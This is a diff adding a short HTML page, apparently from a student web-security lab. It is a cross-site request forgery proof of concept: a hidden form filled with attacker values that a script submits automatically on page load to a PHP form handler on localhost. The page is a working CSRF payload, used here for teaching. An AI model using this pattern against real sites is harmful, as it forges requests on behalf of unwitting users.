@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+    <form action="http://localhost:63342/Lab%205/backend/formular/procesare_formular.php" method="POST">
+        <input type="hidden" name="nume" value="Atacator CSRF">
+        <input type="hidden" name="email" value="hack@hack.com">
+        <input type="hidden" name="varsta" value="99">
+        <input type="hidden" name="nivel" value="avansat">
+        <input type="hidden" name="obiectiv" value="forta">
+        <input type="hidden" name="data-start" value="2026-01-01">
+        <input type="hidden" name="observatii" value="CSRF ATTACK">
+    </form>
+    <script>document.forms[0].submit()</script>
+</body>
+</html>
